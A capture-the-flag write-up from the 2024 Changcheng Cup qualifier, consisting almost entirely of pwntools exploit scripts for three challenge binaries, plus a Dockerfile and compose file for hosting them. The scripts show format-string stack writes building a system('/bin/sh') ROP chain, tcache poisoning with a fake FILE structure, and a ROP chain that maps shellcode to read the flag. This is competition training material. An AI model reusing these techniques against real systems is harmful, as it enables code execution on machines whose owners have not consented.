# [2024长城杯初赛] Pwn题SomeHash SomeTime shutup题解

> 原文: https://www.ctfiot.com/170259.html
> ID: 170259


```
from pwn import *

context.log_level = 'debug'

# io = process("./somehash")
io = remote("127.0.0.1", 9999)
tob = lambda x: str(x).encode()

io.sendlineafter(b"name length> ", tob(-0x98))

payload = flat({
 0: b"xxx>%6$p->%19$p->%21$p-",
 0x80-2: b"a"
})
io.sendlineafter(b"name> ", payload)

io.recvuntil(b"xxx>")
stack = int(io.recvuntil(b"-", drop=True), 16)
log.success(f"stack : {stack:#x}")

io.recvuntil(b">")
libc_leak = int(io.recvuntil(b"-", drop=True), 16)
log.success(f"libc_leak : {libc_leak:#x}")

io.recvuntil(b">")
elf_leak = int(io.recvuntil(b"-", drop=True), 16)
log.success(f"elf_leak : {elf_leak:#x}")

elf_base = elf_leak - 0x258b
log.success(f"elf_base : {elf_base:#x}")

libc_base = libc_leak - 0x29d90
log.success(f"libc_base : {libc_base:#x}")

stack_target = stack - 0x100
payload = f"%{stack_target % 0x10000}c%23$hn".encode()
io.sendlineafter(b"content> ", payload)

target = elf_base + 0x05078 # cnt
payload = f"%{target % 0x10000}c%53$hn".encode()
io.sendlineafter(b"content> ", payload)

payload = f"%{0x100 - 200}c%21$hn".encode()
io.sendlineafter(b"content> ", payload)

stack_target = stack - 0x110
payload = f"%{stack_target % 0x10000}c%23$hn".encode()
io.sendlineafter(b"content> ", payload)

write = libc_base + 0x000000000002a3e5 # pop rdi
for i in range(6):
 target = stack_target + i
 payload = f"%{target % 0x100}c%23$hhn".encode()
 io.sendlineafter(b"content> ", payload)

 payload = f"%{(write // (0x100 ** i)) % (0x100)}c%53$hhn".encode()
 io.sendlineafter(b"content> ", payload)

stack_target = stack - 0x110 + 0x8
payload = f"%{stack_target % 0x10000}c%23$hn".encode()
io.sendlineafter(b"content> ", payload)

write = elf_base + 0x50c0 # ->"/bin/sh"
for i in range(6):
 target = stack_target + i
 payload = f"%{target % 0x100}c%23$hhn".encode()
 io.sendlineafter(b"content> ", payload)

 payload = f"%{(write // (0x100 ** i)) % (0x100)}c%53$hhn".encode()
 io.sendlineafter(b"content> ", payload)

stack_target = stack - 0x110 + 0x10
payload = f"%{stack_target % 0x10000}c%23$hn".encode()
io.sendlineafter(b"content> ", payload)

write = libc_base + 0x000000000002a3e5+1 # ret
for i in range(6):
 target = stack_target + i
 payload = f"%{target % 0x100}c%23$hhn".encode()
 io.sendlineafter(b"content> ", payload)

 payload = f"%{(write // (0x100 ** i)) % (0x100)}c%53$hhn".encode()
 io.sendlineafter(b"content> ", payload)

stack_target = stack - 0x110 + 0x18
payload = f"%{stack_target % 0x10000}c%23$hn".encode()
io.sendlineafter(b"content> ", payload)

write = libc_base + 0x50d60 # system
for i in range(6):
 target = stack_target + i
 payload = f"%{target % 0x100}c%23$hhn".encode()
 io.sendlineafter(b"content> ", payload)

 payload = f"%{(write // (0x100 ** i)) % (0x100)}c%53$hhn".encode()
 io.sendlineafter(b"content> ", payload)

io.sendlineafter(b"content> ", b"/bin/sh\x00")
io.sendlineafter(b"content> ", b"/bin/sh\x00")
io.sendlineafter(b"content> ", b"/bin/sh\x00")
io.sendlineafter(b"content> ", b"/bin/sh\x00")

pause(1)
io.sendline(b"cat flag")

io.interactive()
| ---------- fake chunk -------------------|
...-| --- chunk1 --- | --- chunk2 --- | -...
from pwn import *

context.log_level = 'info'
context.arch = 'amd64'

# io = process(b"./sometime")
io = remote("127.0.0.1", 9999)
tob = lambda x: str(x).encode()

def add(size, content):
 io.sendlineafter(b"(1:
add,2:
release,3:
print)> ", b"1")
 io.sendlineafter(b"size> ", tob(size))
 io.sendafter(b"note> ", content)

def free():
 io.sendlineafter(b"(1:
add,2:
release,3:
print)> ", b"2")

def show():
 io.sendlineafter(b"(1:
add,2:
release,3:
print)> ", b"3")

log.success("exp running ...")
add(0x70, b"aaa")
free()

add(0x30, b"aaa")
free()
add(0x40, b"aaa")
free()
add(0x50, b"aaa")
free()

for i in range(0xa0-0x10, 0xf0, 0x10):
 add(i, b"aaa")
 free()

add(0x60, b"aaa")
free()
add(0x70, b"a" * 0x30 + p64(0) + p64(0x5e1) + b"114514")
free()

add(0x30, b"aaaa")

io.recvuntil(b"I can only assist up to this point. Sorry.")
io.sendline(b"3")

free()
add(0x100, b"\n")
show()
leak = u64(io.recv(6).ljust(8, b"\x00"))
libc_base = leak - 0x21a10a
log.success(f"libc_base: {libc_base:#x}")
free()
libc = ELF("./libc.so.6", checksec=False)
libc.address = libc_base

add(0x100, b"a" * (0x78) + b"deadbeaf")
show()
io.recvuntil(b"deadbeaf")
heap_addr = u64(io.recv(5).ljust(8, b"\x00")) << 12
log.success(f"heap_addr: {heap_addr:#x}")

free()
add(0x100, b"a" * (0x80) + b"deadbeaf")
show()
io.recvuntil(b"deadbeaf")
key = u64(io.recv(8).ljust(8, b"\x00"))
log.success(f"key: {key:#x}")

free()
add(0x100, b"a" * (0x70) + p64(0) + p64(0x51) + p64(heap_addr >> 12))
free()

add(0x100, flat({
 0x80: heap_addr >> 12,
 0x88: key,
 0xc8: 0x31
}))
free()
add(0x50, b"aaaa")
free()

add(0x100, flat({
 0x78: 0x31,
 0x80: heap_addr >> 12,
 0x88: key,
}))
free()
add(0x40, b"aaaa")
free()

add(0x100, flat({
 0x78: 0x51,
 0x80: (libc.symbols["_IO_list_all"]) ^ (heap_addr >> 12),
}))
free()
add(0x20, b"aaaa")
free()

fake_file_addr = heap_addr + 0x7f0
# ref: https://blog.csome.cc/p/houseofminho-wp/
add(0xe0, flat({
 0x0: b" sh;",
 0x28: libc.symbols['system'],
 0xa0: fake_file_addr-0x10, # wide data
 0x88: fake_file_addr+0x100, # 可写，且内存为0即可
 0xD0: fake_file_addr+0x28-0x68, # wide data vtable
 0xD8: libc.symbols['_IO_wfile_jumps'], # vtable
}, filler=b"\x00"))

add(0x20, p64(fake_file_addr))

io.interactive()
[
 pop_rbp, 4 + addr,
 pop_rdi, 0xde,
 0x0004006BB, rbp,
]
def make_bytes(addr, bbb):
 target = []
 for i in range(len(bbb)):
 tmp = bbb[i]
 if tmp == 0:
 continue
 template = [
 pop_rbp, 4 + addr + i,
 pop_rdi, tmp,
 0x0004006BB, base,
 ]
 target.extend(template)
 return target
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

shellcode = asm(
f"""
mov rax, {u64((b"./flag" + bytearray([0]*8))[:8])}
push rax
mov rdi, rsp
mov rsi, 0
mov rax, 2
syscall

mov rdi, 3
mov rsi, rsp
mov rdx, 0x40
mov rax, 0
syscall

mov rdi, 1
mov rsi, rsp
mov rdx, 0x40
mov rax, 1
syscall
""")

"""
0x0000000000400655 : call qword ptr [rbp + 0x48]
"""

tob = lambda x: str(x).encode()
io = process("./shutup")

mov_rax_libc = 0x0000400696
pop_rdi = 0x00000000004007e3
get_rax = 0x004006B7
call_rax = 0x000000000040064e
call_ptr_rax = 0x00000000004008a3
pop_r14_r15 = 0x004007E0
pop_rbp = 0x00000000004005c0
pop_rsp_r13_r14_r15 = 0x00000000004007dd
pop_rbx_rbp_r12_r13_r14_r15 = 0x04007DA
jmp_rax = 0x00000000004005b5
pop_r13_r14_r15 = 0x0004007DE
pop_rsi_r15 = 0x00000000004007e1
atoi = 0x00400550

offset = 0x10 # offset 2 syscall
base = 0x00601380
io.sendline(flat({
 0: base + 0x38, # rbp
 0x8: pop_rdi,
 0x10: base + 0x30,
 0x18: 0x00400703, # call atoi
 0x20: pop_r14_r15,
 0x28: b"ls",
 0x30: tob(offset).rjust(7, b" ") + b"\x00",
 0x38: 0x0601060-0x48,
}, filler=b"\x00"))
pause(1)

io.send(flat({
 0: tob(0x40000),
 0xf: b"\x00"
}, filler=b"\x00"))

def make_bytes(addr, bbb):
 target = []
 for i in range(len(bbb)):
 tmp = bbb[i]
 if tmp == 0:
 continue
 template = [
 pop_rbp, 4 + addr + i,
 pop_rdi, tmp,
 0x0004006BB, base,
 ]
 target.extend(template)
 return target

rop_chain = []

rop_chain.extend(make_bytes(base + 0x40, flat(
 [
 pop_rbx_rbp_r12_r13_r14_r15, 0, 0, base + 0x40 + 8 * 8, 7, 0, 0,
 0x4007C0, # mov rdx, r13
 pop_rbp, 0x0601060,
 pop_rdi, 2,
 get_rax,
 pop_rdi, base & (~0xfff),
 pop_rsi_r15, 0x1000, 0,
 0x000000000040094b, # jmp ptr[rbp]
 base + 0xe0,
 shellcode
 ], filler=b"\x00"
)))

rop_chain.extend(make_bytes(0x00601068, b"7"))
rop_chain.extend(make_bytes(0x00601070, p8(0xa)))

io.sendline(flat({
 0: b"0\x00",
 0x10: base,
 0x18: rop_chain + [
 pop_rdi, 2**32-((0x000601060-0x600fd8)//8), # read got
 get_rax,
 0x0000400715,
 ]
}))

io.shutdown("send")

io.interactive()
FROM ubuntu:22.04@sha256:
b492494d8e0113c4ad3fe4528a4b5ff89faa5331f7d52c5c138196f69ce176a6

RUN apt update
RUN apt install socat -yyq

RUN useradd -M -s /bin/false ctf

WORKDIR /app
COPY your_elf flag /app/
RUN chmod +x /app/your_elf && chmod -w /app/your_elf && chmod -w /app/flag

USER ctf

CMD ["socat", "TCP-LISTEN:
9999,reuseaddr,fork", "EXEC:/app/your_elf"]
version: '3'
services:
 pwn-dev:
 build: .
 ports:
 - "9999:
9999"
 privileged: true
 restart: unless-stopped
```
